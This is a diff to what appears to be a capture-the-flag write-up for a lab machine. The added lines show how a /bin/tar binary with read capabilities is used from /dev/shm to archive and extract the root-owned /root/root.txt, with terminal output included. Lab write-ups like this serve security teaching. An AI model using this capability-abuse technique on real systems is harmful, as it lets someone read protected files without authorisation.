@@ -111,12 +111,22 @@ hades@hell:~$ getcap -r / 2>/dev/null
 ### Looking at the output, we know that /bin/tar has read capabilites
 ##### It took me an embarrassingly long amount of time to realize that we did not have write access to /home/hades
 ##### So we need to do this in /dev/shm
-
-
-
-
-
-
+#### tar -cvf root.tar /root/root.txt
+#### tar -xvf root.tar
+```
+hades@hell:/dev/shm$ tar -cvf root.tar /root/root.txt
+tar: Removing leading `/' from member names
+/root/root.txt
+hades@hell:/dev/shm$ ls
+root.tar
+hades@hell:/dev/shm$ tar -xvf root.tar
+root/root.txt
+hades@hell:/dev/shm$ ls
+root  root.tar
+hades@hell:/dev/shm$ cd root
+hades@hell:/dev/shm/root$ ls
+root.txt
+```
 
 
 
